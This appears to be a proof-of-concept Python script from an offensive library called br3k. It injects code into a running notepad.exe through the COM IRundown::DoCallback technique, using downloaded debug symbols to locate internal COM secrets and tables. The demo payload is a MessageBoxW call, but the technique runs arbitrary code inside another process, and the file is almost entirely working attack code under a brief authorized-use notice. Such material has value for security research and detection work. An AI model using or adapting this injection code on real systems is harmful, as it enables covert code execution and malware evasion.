# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# =============================================================================

import br3k

PROCESS_NAME = "notepad.exe"

if __name__ == "__main__":
    print("Script: Inject via COM IRundown::DoCallback()")
    print()

    br3k.sysapi.init()

    process = br3k.proc.Process(
        name=PROCESS_NAME,
        process_vm_read_strategy=br3k.proc.ProcessVmReadStrategy.ReadVirtualMemory,
        process_open_strategy=br3k.proc.ProcessOpenStrategy.OpenProcess
    )

    process.open()
    process.init_memory()

    com_dll = br3k.sysapi.get_module_handle(module_name="combase")
    if com_dll is None:
        com_dll = br3k.sysapi.get_module_handle(module_name="ole32")
    if com_dll is None:
        raise Exception("unable to get COM DLL handle")

    com_dll_image = br3k.pe.native.PtrImage(data=com_dll, is_file=False)

    temp_path = br3k.fs.get_temp_folder()
    com_dll_pdb_path = br3k.pdb.download(folder_path=temp_path, pe=com_dll_image)
    pdb = br3k.pdb.Pdb(filepath=com_dll_pdb_path)

    irundown = br3k.com.IRundown(
        process=process,
        ole32_address=com_dll,
        ole32_secret_rva=pdb.get_symbol_rva("CProcessSecret::s_guidOle32Secret"),
        ole32_palloc_rva=pdb.get_symbol_rva("CIPIDTable::_palloc"),
        ole32_emptyctx_rva=pdb.get_symbol_rva("g_pMTAEmptyCtx"),
        moxid_offset=pdb.get_field_offset("OXIDEntry", "_moxid"),
    )

    pfn_messagebox = br3k.sysapi.get_proc_address("user32.dll", "MessageBoxW")

    irundown.read_ipid_entries()
    irundown.execute(ep=pfn_messagebox, arg1=0)
